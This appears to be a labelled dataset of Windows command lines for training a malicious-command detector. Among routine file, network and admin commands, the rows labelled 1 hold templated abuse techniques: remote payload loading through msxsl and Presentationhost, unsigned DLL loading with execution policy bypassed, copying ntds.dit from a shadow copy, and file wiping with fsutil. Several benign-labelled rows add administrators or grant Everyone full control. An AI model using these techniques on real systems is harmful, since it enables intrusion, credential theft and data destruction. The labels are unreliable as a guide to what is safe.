Command,Label
"icacls.exe ""C:\Logs\Temp\dpttok.dat"" /grant Everyone:F",0
tasklist.exe /v,0
ipconfig.exe /all,0
msxsl.exe {PATH:.xml} {PATH:.xsl},1
tasklist.exe /v,0
MSAccess.exe {REMOTEURL},1
"copy.exe ""C:\Users\hifhq\Pictures\Desktop\fghxtcbvvp.txt"" ""C:\Users\nrht\Documents\Pictures\ubvjzequ.txt""",0
net use Z: \\192.168.37.165\data,0
C:\Windows\System32\netsh.exe advfirewall show allprofiles,0
"C:\Windows\copy.exe ""C:\Temp\Program Files\hybyqjbgb.dat"" ""C:\Windows\Program Files\fynblesd.ini""",0
"copy ""C:\Logs\Users\tzmovszh.txt"" ""D:\Program Files\Windows\paeye.dat""",0
net localgroup Administrators cjazpgrm /add,0
"attrib.exe +h ""C:\Windows\Windows\vnwsvoixox.log""",0
"type ""C:\Users\ylzvk\Documents\ggepgq.exe""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\ibhoocpj\Downloads\Documents\betbmshmf.ini\"" \""D:\Users\Logs\qhyinjz.ini\"""" /sc daily /st 23:00",0
net localgroup Administrators qdmdvkae /add,0
"C:\Windows\dir.exe ""D:\Program Files""",0
echo BTJmZAGEQbeK > D:\Windows\kmripzuu.exe,0
net use Z: \\192.168.218.55\backup,0
"DefaultPack.EXE /C:""{CMD}""",1
D:\Windows\System32\net.exe use Z: \\192.168.129.182\public,0
net.exe use Z: \\192.168.12.58\data,0
"fsutil file layout ""D:\Users\AppData\bflxiqwq.dll""",0
"move ""D:\Users\Program Files\hcqgqg.exe"" ""D:\Logs\edhjekri.log""",0
"echo %DATE% %TIME% >> ""D:\AppData\xaphasgor.sys""",0
"fsutil.exe file layout ""D:\Logs\Logs\ppyqzk.dat""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\cmtck.txt\"" \""C:\Logs\Logs\ukpgaqeyt.exe\"""" /sc daily /st 23:00",0
add volume <volume> [provider dbe96af8-5b14-450b-9d3b-fdfb1b5730dd],0
fsutil volume [querycluster] <volumepath> <cluster> [<cluster>] …,0
ping.exe 192.168.235.138,0
"icacls ""D:\Temp\fchpkxjrk.exe"" /grant Everyone:F",0
"attrib +h ""C:\Temp\Program Files\yyjfzncfd.exe""",0
netsh.exe advfirewall show allprofiles,0
"E:\Windows\System32\attrib.exe +h ""D:\Users\eoge\Downloads\ykccw.dll""",0
ping 192.168.180.100,0
C:\Windows\System32\tasklist.exe /v,0
add disk=458 [align=458] [wait] [noerr],0
"del ""C:\Users\jmstpxs\Desktop\fddmeq.sys"" /f /q",0
icacls.exe data.log /grant Everyone:R,0
"findstr.exe /C:""roDjjy8dglLB"" ""C:\Program Files\AppData\kprohlbm.log""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\lvjks\Documents\Downloads -Recurse | Select-Object FullName, Length""",0
"D:\Windows\System32\findstr.exe /C:""KiGt8FmXKmyr"" ""C:\Temp\Program Files\btcoq.ini""",0
"fsutil.exe file layout ""C:\Logs\ctmnbmhl.sys""",0
cmd.exe /c dir C:\Temp,0
shrink querymax,0
"C:\Windows\move.exe ""D:\Program Files\Windows\mmugv.sys"" ""D:\Users\pfjcmxxd\Pictures\oyxidegwep.txt""",0
"rundll32 ieadvpack.dll, RegisterOCX {cmd.exe}",1
replace drive=7,0
"type.exe ""C:\Logs\AppData\uxwyyyeav.txt""",0
whoami.exe /all,0
"icacls ""C:\Users\AppData\ojzfetnx.exe"" /grant Everyone:F",0
"attrib.exe +h ""D:\Users\wkahr\Desktop\hkgrac.sys""",0
"icacls.exe ""D:\Users\Temp\jauekczcub.dat"" /grant Everyone:F",0
"certutil -hashfile ""C:\Users\Temp\teyfovazs.exe"" SHA256",0
"echo.exe %DATE% %TIME% >> ""C:\Program Files\Users\uzkkx.ini""",0
"move ""C:\Program Files\Temp\bdeghgptfh.txt"" ""C:\Temp\vdkfhcesv.log""",0
"rmdir.exe ""C:\Windows\Logs"" /s /q",0
"type.exe ""D:\Logs\ddnmxow.sys""",0
"del ""C:\Users\ktpm\Pictures\rncqkydcq.exe"" /f /q",0
"findstr /C:""I94FwO0mSgit"" ""D:\Program Files\snuza.exe""",0
"type.exe ""C:\Users\upvctvpd\Pictures\ojgfaz.log""",0
ping.exe 192.168.233.31,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Program Files\oojhwp.sys\"" \""C:\Windows\Program Files\nwavlfimi.ini\"""" /sc daily /st 23:00",0
"C:\Program Files (x86)\findstr.exe /i ""error"" config.ini",0
edit newtextfile.txt,0
"mkdir.exe ""D:\Users\qjaihnla\Desktop""",0
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl},1
"del ""D:\Users\atzeo\Downloads\Downloads\rjacisbmfw.sys"" /f /q",0
for {%%|%}<variable> in (<set>) do <command> [<commandlineoptions>],0
wmic.exe process list brief,0
net.exe user huenavsy /add,0
freedisk [/s <computer> [/u [<domain>\]<user> [/p [<password>]]]] [/d E] [<value>],0
C:\Windows\System32\net.exe localgroup Administrators backup /add,0
(jan*.doc jan*.rpt feb*.doc feb*.rpt),0
wmic.exe process list brief,0
"copy.exe ""C:\Users\qyqnitrv\Desktop\haobmiwniv.dll"" ""D:\Users\zlerc.ini""",0
net.exe user toysmrja /add,0
"C:\Windows\powershell.exe -Command ""Get-Service | Where-Object {{$_.Status -eq 'Running'}}""",0
"C:\Windows\fsutil.exe file layout ""D:\Users\nrfbkrhr\Desktop\Pictures\gaebj.ini""",0
"move ""C:\Temp\grgiqcyh.log"" ""D:\Users\snbngwamp.exe""",0
"C:\Windows\fsutil.exe file layout ""D:\Program Files\jrvofckg.dat""",0
C:\Program Files\certutil.exe -hashfile backup.dat SHA256,0
"type ""D:\Logs\Temp\ckqtazqae.dat""",0
"rmdir.exe ""D:\AppData"" /s /q",0
net localgroup Administrators fbfwjnvs /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""C:\Temp\ggawpit.sys\"" \""D:\AppData\ewifj.dll\"""" /sc daily /st 23:00",0
"echo %DATE% %TIME% >> ""D:\Windows\nlevuq.sys""",0
"move ""D:\Program Files\xivysdxyf.ini"" ""C:\Users\tuai\Downloads\rzniwmglv.ini""",0
"certutil -hashfile ""D:\Logs\Users\iefmrtsm.txt"" SHA256",0
net.exe localgroup Administrators xopaemak /add,0
"del ""D:\Program Files\Program Files\ulfaci.log"" /f /q",0
"D:\Windows\copy.exe ""D:\Program Files\AppData\whpuwy.dat"" ""D:\Users\xvam\Downloads\wvqtqbie.dll""",0
"copy.exe ""D:\Program Files\ryahn.txt"" ""C:\Users\cpdwlypk\Desktop\Pictures\pwhesl.sys""",0
net localgroup Administrators uoazmtlt /add,0
"certutil -hashfile ""D:\Users\yibzx\Desktop\vxagbsqoce.txt"" SHA256",0
"dir ""C:\Users\vuatftzs\Downloads\Pictures"" /s /b",0
net.exe localgroup Administrators ggwzlclo /add,0
"move.exe ""D:\Logs\pgiydbiflg.dat"" ""C:\Users\jgddgocb.log""",0
echo.exe 4ESPQnuk3fcG > C:\AppData\mpesrymtxn.ini,0
net.exe localgroup Administrators user1 /add,0
attrib.exe +r document.txt,0
"del ""C:\Windows\Program Files\afunlhooc.log"" /f /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Users\uhkmuh.sys\"" \""D:\Users\Program Files\capay.dll\"""" /sc daily /st 23:00",0
diskshadow/add/import,0
"icacls ""D:\Logs\Program Files\kwxtns.ini"" /grant Everyone:F",0
"powershell.exe -Command ""Get-Process""",0
netstat.exe -an,0
"C:\Windows\System32\icacls.exe ""C:\Users\syevfqnr.log"" /grant Everyone:F",0
echo.exe X5Srj95Q43dn > C:\Windows\Temp\ixenzzm.dll,0
exit [/b] [1],0
"del ""D:\Logs\Users\mbtmx.dat"" /f /q",0
"copy ""C:\Temp\loynweeju.ini"" ""D:\Users\mjobburw.exe""",0
ping.exe 192.168.142.197,0
"rmdir.exe ""D:\Users\phijghpd\Downloads\Desktop"" /s /q",0
"del ""D:\Logs\Temp\cuare.exe"" /f /q",0
net user xhmeqzrr /add,0
attrib.exe +r document.txt,0
"del ""D:\Windows\geuplswfyq.ini"" /f /q",0
certutil.exe -hashfile backup.dat SHA256,0
"C:\Windows\System32\move.exe ""C:\Logs\Program Files\jchvrh.dll"" ""C:\Program Files\dhkokszl.ini""",0
"attrib +h ""C:\Temp\Logs\pqgxxjsi.exe""",0
"C:\Program Files\findstr.exe /i ""success"" data.log",0
"C:\Windows\NTDS\ntds.dit' to
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit'",1
"certutil.exe -hashfile ""D:\Windows\Program Files\yoabcwh.sys"" SHA256",0
"certutil.exe -hashfile ""D:\Users\Users\avowpabzc.dat"" SHA256",0
dir.exe C:\Users\Documents,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"del ""D:\Program Files\Windows\tbpazvvzj.dll"" /f /q",0
C:\Windows\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\qyymrir.exe\"" \""D:\Windows\Temp\zmjleo.exe\"""" /sc daily /st 23:00",0
net.exe use Z: \\192.168.113.117\public,0
"copy.exe ""D:\Logs\Temp\rkslodz.txt"" ""D:\Program Files\Windows\eqtjhwj.sys""",0
driverquery /s server1 /u maindom\user1 /p p@ssw3d,0
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},1
"certutil.exe -hashfile ""C:\Program Files\Logs\hljsqbfndq.ini"" SHA256",0
net use Z: \\192.168.109.247\data,0
net use Z: \\192.168.191.213\data,0
detail vdisk,0
"findstr.exe /C:""FXdDjox0UN2M"" ""D:\Temp\Program Files\gmwdqqb.ini""",0
"certutil.exe -hashfile ""D:\Temp\nzqkkk.txt"" SHA256",0
attrib.exe +r document.txt,0
"del ""C:\Temp\shctlgq.dll"" /f /q",0
echo.exe sbq1HGYbeONL > C:\Temp\Users\mgacjqyvej.sys,0
net.exe use Z: \\192.168.227.72\data,0
"findstr.exe /C:""DauJPJO5EjZK"" ""C:\Program Files\Users\dgvhiump.dll""",0
"dir ""D:\Logs\Logs""",0
"findstr /C:""aety4JVWuhgK"" ""C:\AppData\gmcexhid.exe""",0
"findstr.exe /C:""7Aps7JKm3Nqp"" ""D:\Logs\ybukaep.txt""",0
"C:\Windows\certutil.exe -hashfile ""D:\Users\mpxlvovr\Pictures\ppvhivdui.txt"" SHA256",0
net user cnggyklz /add,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\icpghzfp\Downloads\Pictures -Recurse | Select-Object FullName, Length""",0
net use Z: \\192.168.85.90\data,0
fsutil.exe 8dot3name strip /l mylogfile.log /s d:\MyData,0
"dir.exe ""D:\Windows\Users""",0
"move.exe ""C:\Logs\vwvpyvgw.txt"" ""D:\Temp\umnkpl.dll""",0
icacls.exe config.ini /grant Everyone:R,0
"del ""C:\Temp\nbxwogctmu.dll"" /f /q",0
C:\Windows\System32\net.exe localgroup Administrators dlklujwa /add,0
diskshadow/set/writer exclude [<writer> | <component>],0
"attrib +h ""C:\Program Files\ycoresuv.ini""",0
ipconfig.exe /all,0
"type.exe ""D:\Temp\AppData\yamaxpgm.sys""",0
WorkFolders,1
net.exe localgroup Administrators moyxltgc /add,0
bginfo.exe {PATH:.bgi} /popup /nolicprompt,1
"certutil -hashfile ""C:\Users\ecdvo\Pictures\Pictures\gugqjc.txt"" SHA256",0
D:\Windows\System32\ping.exe 192.168.193.141,0
net.exe user vdbfupuq /add,0
"attrib.exe +h ""C:\Temp\Temp\xqikd.txt""",0
"findstr.exe /C:""9Ny7qvTFPVTu"" ""C:\Logs\Program Files\ingjzt.dll""",0
net localgroup Administrators vnsbhidi /add,0
net.exe localgroup Administrators idflygss /add,0
"powershell.exe -Command ""Get-Process""",0
"copy.exe ""C:\Program Files\Program Files\rwjoquum.txt"" ""D:\Temp\Users\icjug.dll""",0
ping.exe 192.168.1.1,0
"icacls.exe ""C:\Temp\mafwbnpdis.txt"" /grant Everyone:F",0
"copy ""C:\Temp\Temp\yanhj.exe"" ""C:\Users\AppData\gufqjz.dll""",0
"del ""D:\Temp\Logs\stkcywoii.txt"" /f /q",0
C:\Windows\net.exe user wsniklib /add,0
"fsutil file layout ""C:\Users\ihxfjid\Pictures\ufuypxf.dll""",0
net.exe localgroup Administrators kxwuwjro /add,0
net.exe use Z: \\192.168.137.236\public,0
"fsutil file layout ""D:\Logs\pjwwdvp.dat""",0
tasklist.exe /v,0
"move.exe ""C:\Users\dzqezcoxrp.dat"" ""D:\Users\qzaephlb\Downloads\nnduzjmu.ini""",0
"attrib +h ""D:\Program Files\aeiixzm.ini""",0
icacls.exe config.ini /grant Everyone:R,0
"type.exe ""D:\Temp\ptuuqvxjzt.sys""",0
"type ""D:\Temp\Temp\yfesjhyn.exe""",0
"icacls.exe ""C:\Logs\Users\ezfzim.dll"" /grant Everyone:F",0
net.exe user guest /add,0
"icacls.exe ""C:\Program Files\ugmsh.txt"" /grant Everyone:F",0
"copy.exe ""C:\Users\nbxfaut\Pictures\shknlvwgl.dat"" ""C:\AppData\wbvtsqbg.ini""",0
"move ""D:\Logs\bokynkozkl.exe"" ""D:\Program Files\Logs\cvkodra.txt""",0
E:\Windows\System32\net.exe use Z: \\192.168.26.44\data,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\wlesuc\Desktop\Downloads\heemzxt.exe\"" \""C:\Temp\uqzzud.ini\"""" /sc daily /st 23:00",0
"C:\Windows\System32\findstr.exe /C:""YYvoxU4GMNjL"" ""C:\Temp\mhnjhqns.dat""",0
ping.exe 192.168.91.113,0
icacls.exe backup.dat /grant Everyone:R,0
"create lun stripe [size=231] [drives=<n, n> [,...]]  [stripesize=231] [noerr]",0
C:\Windows\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"move ""D:\Users\bkoysca\Desktop\Documents\ovlft.ini"" ""D:\Windows\Logs\fvhuvnu.txt""",0
netstat.exe -an,0
net.exe user xopsmeji /add,0
net use Z: \\192.168.200.92\backup,0
"dir.exe ""C:\Program Files\Windows"" /s /b",0
"del ""C:\AppData\AppData\wazte.dll"" /f /q",0
"icacls ""C:\Users\cafjj\Documents\qvczekeyp.ini"" /grant Everyone:F",0
"powershell -Command ""Get-WmiObject -Class Win32_Process -Filter 'name like \""%chrome.exe%\""'""",0
diskshadow/add/delete shadows [all | volume <volume> | oldest <volume> | set <setID> | id <shadowID> | exposed {<drive> | <mountpoint>}],0
ping 192.168.107.123,0
"copy.exe ""C:\Logs\qbkocdruhg.dll"" ""C:\Temp\gctxdzrrh.dat""",0
"del ""D:\Users\Users\njtonufatl.log"" /f /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\AppData\azninbu.txt\"" \""C:\Program Files\bqrraiiygy.dat\"""" /sc daily /st 23:00",0
"certutil.exe -hashfile ""D:\Users\Temp\jwcoqy.ini"" SHA256",0
select {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup } [529],0
"del ""D:\Windows\uthjneoey.ini"" /f /q",0
"powershell -Command ""Get-ChildItem -Path C:\Users\fdeat\Documents -Recurse | Select-Object FullName, Length""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\bfkoh.exe\"" \""C:\Program Files\Users\puurupxb.log\"""" /sc daily /st 23:00",0
"fsutil.exe file layout ""D:\Program Files\bdildcop.dll""",0
"echo.exe %DATE% %TIME% >> ""C:\Windows\cmvgxcdy.sys""",0
name {subsystem | lun | target} [djjwyodg],0
"powershell.exe -Command ""Get-Service""",0
ping.exe 192.168.130.199,0
"move ""D:\Program Files\eeidshfibi.txt"" ""D:\Users\xlmzqu\Pictures\Downloads\usyaj.txt""",0
"del ""C:\Temp\pqgjk.txt"" /f /q",0
"fsutil file layout ""D:\Windows\mkhopyxawe.dat""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\yegfukkn\Desktop -Recurse | Select-Object FullName, Length""",0
type.exe: [1] VSS_PROV_SYSTEM,0
netsh.exe interface show interface,0
net.exe user gixwadlb /add,0
eventcreate [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>,0
net localgroup Administrators fcrdmtmp /add,0
"icacls ""D:\Users\clrtce\Downloads\nweifoo.exe"" /grant Everyone:F",0
pktmon.exe start --etw,1
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\Users\ohtbjbdyph.dll\"" \""D:\Users\tlkajrm\Downloads\kdpdlaesxy.dll\"""" /sc daily /st 23:00",0
net.exe use Z: \\192.168.201.43\data,0
"certutil.exe -hashfile ""C:\Program Files\zvjsvoaoov.log"" SHA256",0
ping.exe 172.16.0.1,0
net use Z: \\192.168.123.49\backup,0
"mkdir ""C:\Windows""",0
"del ""C:\Users\rnhtz\Downloads\Pictures\htjnvsmoj.txt"" /f /q",0
"mkdir.exe ""C:\Program Files\Logs""",0
"dir.exe ""D:\AppData\Temp"" /s /b",0
"dir ""D:\AppData\Logs""",0
"fsutil.exe file layout ""C:\Program Files\Logs\bngsty.dll""",0
"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",1
"findstr.exe /C:""dp4XNr9XShBn"" ""C:\Windows\AppData\ugfqxv.ini""",0
net.exe use Z: \\192.168.10.79\data,0
echo DQilnM3oOdmQ > D:\Windows\rofflrppg.ini,0
"copy ""D:\Users\vqltrx.dll"" ""D:\Windows\pzvcwxf.log""",0
"certutil.exe -hashfile ""D:\Program Files\jvlte.sys"" SHA256",0
"certutil -hashfile ""C:\Program Files\rwgnyrfv.dll"" SHA256",0
net localgroup Administrators gvzpqnmo /add,0
"move ""D:\AppData\Windows\tmtdrm.dll"" ""D:\AppData\seevlscfkm.exe""",0
CLSID: {65ee1dba-8ff4-4a58-ac1c-3470ee2f376a},0
"attrib.exe +h ""C:\Program Files\xdcwqxn.txt""",0
tasklist.exe /v,0
fsutil.exe usn [readjournal] [c= <chunk-size> s=<file-size-threshold>] C:\AppData,0
"attrib.exe +h ""C:\Program Files\Temp\txbay.dat""",0
"certutil.exe -hashfile ""C:\AppData\hqafsyyzr.log"" SHA256",0
"certutil -hashfile ""D:\Temp\qgicf.txt"" SHA256",0
"fsutil file layout ""D:\Users\zjqnisca\Downloads\xeibo.txt""",0
echo mnqiqXCPSbsa > C:\Users\yyxjxs\Pictures\measjaqwk.dll,0
net.exe localgroup Administrators service /add,0
net.exe localgroup Administrators pyhueoak /add,0
"attrib +h ""C:\AppData\Logs\ctculm.dll""",0
rem assigned the letter D. The second and third drives,0
"C:\Windows\System32\powershell.exe -Command ""Get-Service""",0
"icacls ""C:\Program Files\Program Files\rjnpcp.txt"" /grant Everyone:F",0
net.exe localgroup Administrators afmarhwe /add,0
gpt attributes=0x8000000000000000,0
"icacls.exe ""D:\Users\faqk\Documents\Documents\dvjwmobu.ini"" /grant Everyone:F",0
"powershell.exe -Command ""Get-Service""",0
"move.exe ""D:\Program Files\habigreqbg.log"" ""D:\Program Files\kgbzqn.sys""",0
"icacls.exe ""C:\Program Files\Windows\tkfmera.log"" /grant Everyone:F",0
"copy ""C:\Temp\Users\zyvuzastq.txt"" ""C:\Users\qqnm\Pictures\Pictures\zlhypuz.exe""",0
echo.exe IjXOD0B5G8FY > D:\Logs\AppData\fcflcr.dat,0
flattemp {/query | /enable | /disable},0
"del ""D:\Temp\Program Files\oggcbqonxk.txt"" /f /q",0
icacls.exe document.txt /grant Everyone:R,0
ping.exe 10.0.0.1,0
[-y symbol path],0
Presentationhost.exe {REMOTEURL},1
"icacls.exe ""C:\Users\dkpbkze.ini"" /grant Everyone:F",0
C:\Windows\System32\net.exe use Z: \\192.168.88.119\public,0
"type.exe ""D:\Temp\Program Files\ztfpgtize.sys""",0
cmd.exe /c dir C:\Program Files,0
net.exe localgroup Administrators vewfqbun /add,0
"copy.exe ""C:\Program Files\Users\nzlryswcjm.log"" ""C:\Users\tizcboe.sys""",0
wmic.exe process list brief,0
systeminfo.exe,0
"C:\Windows\dir.exe ""D:\Logs\Windows"" /s /b",0
C:\Windows\System32\whoami.exe /all,0
ping.exe 192.168.94.185,0
echo.exe hqtP7sekybm6 > C:\AppData\Temp\xdcevybwc.dat,0
verclsid.exe /S /C {CLSID},1
"C:\Windows\findstr.exe /C:""zEnf8HKaJpl5"" ""D:\Temp\eqbbucm.sys""",0
systeminfo.exe,0
replace drive=2,0
"findstr.exe /C:""lkFIHZDlBlTF"" ""D:\Program Files\dbxrxylh.ini""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\Windows\Program Files -Recurse | Select-Object FullName, Length""",0
"echo.exe %DATE% %TIME% >> ""C:\Logs\bbjpfl.dll""",0
C:\Windows\netstat.exe -an,0
"C:\Windows\attrib.exe +h ""C:\Program Files\Logs\btjyh.txt""",0
"attrib +h ""D:\Users\qjtvs\Desktop\naqutjbvz.exe""",0
"C:\Windows\System32\type.exe ""C:\Users\mxzirbsph.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\dvnnvmbhu.dat\"" \""D:\Temp\AppData\wowajwiw.ini\"""" /sc daily /st 23:00",0
"certutil.exe -hashfile ""C:\Program Files\lbooyxjt.dll"" SHA256",0
"fsutil file layout ""D:\AppData\tfvta.dll""",0
net.exe use Z: \\192.168.174.120\data,0
"certutil.exe -hashfile ""C:\AppData\Users\flmnaikhoq.dat"" SHA256",0
"findstr /C:""ELg2XO4JGhiU"" ""D:\Logs\AppData\ykcerlrpa.dat""",0
"C:\Windows\fsutil.exe file layout ""D:\Program Files\pelnhl.dat""",0
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},1
dir.exe C:\Program Files,0
C:\Windows\System32\fsutil.exe devdrv trust [/f] C:\Logs\AppData,0
"icacls.exe ""D:\AppData\iyvtkeybxe.ini"" /grant Everyone:F",0
echo.exe arhq3Ki9Ln9r > D:\Users\nklpq\Downloads\Pictures\arbtecf.dat,0
ping.exe 192.168.44.197,0
"rmdir.exe ""C:\Users\sakmynp\Downloads"" /s /q",0
"powershell.exe -Command ""Get-Service""",0
"findstr.exe /C:""1arpPEh59m3x"" ""D:\Temp\Temp\qlttc.dll""",0
"del ""C:\Program Files\qyepys.dll"" /f /q",0
C:\Windows\System32\echo.exe idxRMYXw987B > D:\Users\eofhfgfa.txt,0
net use Z: \\192.168.20.180\backup,0
attrib.exe +r document.txt,0
"del ""D:\Users\Logs\tskdvyhrw.txt"" /f /q",0
"icacls.exe ""C:\Temp\juaik.txt"" /grant Everyone:F",0
"findstr.exe /C:""bazepmPhuTu4"" ""C:\Program Files\Temp\qqeoja.log""",0
C:\Windows\net.exe use Z: \\192.168.135.178\public,0
C:\Windows\System32\net.exe use Z: \\192.168.218.178\data,0
"icacls.exe ""C:\AppData\rgvpmrgr.dat"" /grant Everyone:F",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\ccwj\Pictures\Pictures\mpjnt.dll\"" \""D:\Users\wbnxd\Documents\Downloads\fvxtczjc.log\"""" /sc daily /st 23:00",0
"findstr /C:""HV5AVJM2hi9J"" ""D:\Program Files\eqnmb.ini""",0
"move ""C:\AppData\AppData\fkwjha.sys"" ""D:\Temp\Logs\rhtgf.dll""",0
"dir ""D:\Users\doxe\Desktop""",0
"type.exe ""C:\AppData\rntdi.txt""",0
"findstr /C:""jY8f7S5YgPSy"" ""C:\AppData\gsdgo.ini""",0
"findstr /C:""pDfF8yHpiMQ0"" ""C:\Windows\Temp\decssht.exe""",0
net localgroup Administrators dsjfzprh /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Windows\Windows\lynerorcn.ini\"" \""D:\AppData\zlwtna.dll\"""" /sc daily /st 23:00",0
"copy.exe ""C:\Windows\Program Files\hkgtnwi.log"" ""D:\AppData\yggrjrho.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\lmnexhgzv.exe\"" \""D:\Temp\qbwmnmfyu.dll\"""" /sc daily /st 23:00",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\qguoedqkb.log\"" \""D:\Program Files\Users\sbgwmi.dat\"""" /sc daily /st 23:00",0
"del ""D:\Program Files\Windows\espcvss.txt"" /f /q",0
net.exe localgroup Administrators gsuijxlk /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\Windows\vjrosbqbiw.sys\"" \""D:\Users\opekj\Pictures\Desktop\oofjip.exe\"""" /sc daily /st 23:00",0
"icacls ""C:\Program Files\AppData\htdxc.ini"" /grant Everyone:F",0
"tasklist | findstr ""spoolsv.exe""",0
arp.exe -a,0
ECMangen.exe {REMOTEURL},1
"del ""C:\Program Files\xmqpjaasvv.sys"" /f /q",0
net localgroup Administrators msjruyaf /add,0
"findstr.exe /i ""warning"" data.log",0
"copy ""C:\Windows\kkhwmblh.exe"" ""C:\AppData\Temp\shafmfhjjd.dll""",0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\japka\Pictures -Recurse | Select-Object FullName, Length""",0
"del ""C:\Logs\ocddjb.dll"" /f /q",0
"C:\Windows\System32\icacls.exe ""C:\Users\icyygb.log"" /grant Everyone:F",0
"create lun mirror [size=883] [drives=<n, n> [,...]] [stripesize=883] [noerr]",0
"C:\Windows\echo.exe %DATE% %TIME% >> ""D:\Windows\lgeuux.log""",0
dir.exe C:\Users\Documents,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\wdnipee.exe\"" \""C:\Temp\Temp\ygfnnhq.exe\"""" /sc daily /st 23:00",0
net.exe localgroup Administrators ratjkrnc /add,0
"powershell.exe -Command ""Get-Process""",0
"type.exe ""D:\Logs\Windows\yoexiwykd.dat""",0
"copy.exe ""D:\Program Files\lpseskai.dll"" ""C:\Windows\zyjbnyd.sys""",0
"C:\Windows\certutil.exe -hashfile ""C:\Temp\beytb.ini"" SHA256",0
"C:\Program Files\powershell.exe -Command ""Get-Service""",0
ipconfig.exe /all,0
"copy.exe ""C:\Temp\Windows\sufxbe.txt"" ""C:\Temp\potcox.dat""",0
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,1
"findstr /C:""IGaNLPPWBKra"" ""D:\Windows\Temp\yecnrlo.txt""",0
echo.exe jTPyxqDWJ9xG > C:\Program Files\Program Files\koylunu.log,0
net localgroup Administrators qflrxtri /add,0
%VSS_SHADOW_1%,0
wmic.exe process list brief,0
"dir ""C:\Windows\Program Files""",0
"findstr.exe /C:""2hq8quxVpDpH"" ""D:\Users\slyxa\Documents\wdcyb.txt""",0
"echo %DATE% %TIME% >> ""C:\Windows\fgnal.exe""",0
"rmdir ""C:\Logs\Logs"" /s /q",0
"findstr /C:""NoxDDWHNsent"" ""C:\Users\ihgosffli.txt""",0
"findstr /C:""juiXghFzLKWq"" ""C:\AppData\rvtlere.exe""",0
